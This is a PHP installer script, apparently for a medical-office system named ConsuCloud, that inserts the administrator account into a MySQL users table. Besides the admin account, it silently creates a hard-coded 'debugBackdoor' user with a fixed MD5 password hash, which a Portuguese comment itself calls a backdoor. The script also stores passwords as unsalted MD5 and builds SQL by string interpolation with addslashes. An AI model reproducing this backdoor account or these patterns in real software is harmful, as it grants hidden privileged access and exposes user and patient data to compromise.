<?php
header ('Content-type: text/html; charset=UTF-8');

$senha = md5(trim(addslashes(strip_tags($_POST['senha']))));
$email = trim(addslashes(strip_tags($_POST['email'])));

require "../assets/connect.php";

//Executar queries
$query = $mysqli->query("INSERT INTO usuarios (crm,tipoUsuario,nomeComp,areaAtuacao,numIdRG,RG_UFEXP,dataNasc,telCel,telFixo,email,endereco_logradouro,
endereco_numero,endereco_complemento,endereco_bairro,endereco_cidade,endereco_cep,endereco_estado,login,senha,nomeCurto) 
VALUES ('SysAdmin', 'admin', 'Administrador', 'Administrador', '0', 'ConsuCloud', '2000-01-01', '00 000000000', '00 00000000', '$email', 'ConsuCloud', '0', 
'ConsuCloud', 'ConsuCloud', 'ConsuCloud', '0', 'ConsuCloud', 'SysAdmin', '$senha', 'Admin')"); 

//COMENTE ESTA QUERY (INCLUINDO A REMOÇÃO DELA DA CHECAGEM NO IF) SE VOCÊ QUISER REMOVER COMPLETAMENTE O BACKDOOR DO SISTEMA
$query1 = $mysqli->query("INSERT INTO usuarios (crm,tipoUsuario,nomeComp,areaAtuacao,numIdRG,RG_UFEXP,dataNasc,telCel,telFixo,email,endereco_logradouro,
endereco_numero,endereco_complemento,endereco_bairro,endereco_cidade,endereco_cep,endereco_estado,login,senha,nomeCurto) 
VALUES ('debugBackdoor', 'debug', 'Debugger','Debugging', '0', 'ConsuCloud', '2000-01-01', '00 000000000', '00 00000000', 'debug@debug.bug', 'ConsuCloud', '0', 
'ConsuCloud', 'ConsuCloud', 'ConsuCloud', '0', 'ConsuCloud', 'Debug', 'de63e52f648fc217723551ae0c57397b', 'Debug')"); 

/*
  Se a query para adicionar o backdoor estiver descomentada, adicione a linha abaixo no IF da checagem de queries:
    && $query1
*/

if ($query && $query1){
  echo '<script type="text/javascript">
					location.href="finish.php";
					</script>';
}else{
  echo $mysqli->error;
}

$mysqli->close();
?>